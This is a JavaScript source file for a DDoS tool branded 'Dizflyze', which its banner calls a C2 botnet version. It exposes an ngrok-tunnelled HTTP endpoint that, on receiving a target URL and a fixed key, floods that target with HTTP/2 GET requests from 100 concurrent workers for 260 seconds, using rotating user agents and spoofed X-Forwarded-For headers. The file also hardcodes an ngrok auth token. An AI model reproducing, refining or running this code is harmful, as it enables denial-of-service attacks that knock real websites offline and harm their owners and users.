require('colors');
const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const bodyParser = require('body-parser');
app.use(bodyParser.json());

let C = false;
let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;

const L = () => {
  console.log(`
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `.cyan);
  console.log(`C2 BOTNET VERSION\n`.yellow);
};

const N = async () => {
  try {
    await ngrok.authtoken('2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa');
    const url = await ngrok.connect({ proto: 'http', addr: currentPort, region: 'ap' });
    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n  ╚═➤ '.bold} ${url.underline}`);
    console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
    return url;
  } catch (e) {
    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
    process.exit(1);
  }
};

const A = async (target, duration) => {
  const methods = ['GET'];
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone14,3; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/118.0',
    'Mozilla/5.0 (PlayStation 5; PlayStation 5/6.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.3.15.4 NintendoBrowser/5.1.0.22422',
    'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.104 Safari/537.36 CrKey/1.54.248666',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/6.2.3105.47 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) HuaweiBrowser/12.1.6.303 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
    'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
    'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
    'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7',
    'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.2) Gecko/20060404 Firefox/1.5.0.4'
  ];

  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} detik\n`);

  const startTime = Date.now();
  const targetURL = new URL(target);

  const flood = async () => {
    try {
      const client = http2.connect(target, { rejectUnauthorized: false });
      client.on('error', () => {});
      await new Promise((resolve) => {
        client.on('connect', () => {
          const interval = setInterval(() => {
            if (Date.now() - startTime >= duration * 1000) {
              clearInterval(interval);
              client.close();
              resolve();
              return;
            }
            const req = client.request({
              ':method': methods[Math.floor(Math.random() * methods.length)],
              ':path': '/',
              'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
              'accept-language': 'en-US,en;q=0.9',
              'x-forwarded-for': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
              'cache-control': 'no-cache'
            });
            req.on('response', () => req.close());
            req.end();
          }, 10);
        });
      });
      client.on('close', resolve);
    } catch {}
  };

  const workers = Array.from({ length: 100 }, () => flood());
  await Promise.all(workers);
  console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
};

app.post('/attack', async (req, res) => {
  if (C) return res.status(429).json({ error: '[ PROSES ]' });
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });
  try {
    new URL(target);
    C = true;
    await A(target, 260);
    C = false;
    res.status(200).json({ status: '[ STARTED ]', target });
  } catch (e) {
    C = false;
    res.status(400).json({ error: '[ URL INVALID! ]' });
  }
});

app.get('/info', async (req, res) => {
  try {
    const response = await fetch(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
    const data = await response.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
  }
});

L();
app.listen(currentPort, () => {
  console.log(`${'[ RUNNING ] :'.bold} ${currentPort.toString().yellow}`);
  N();
});
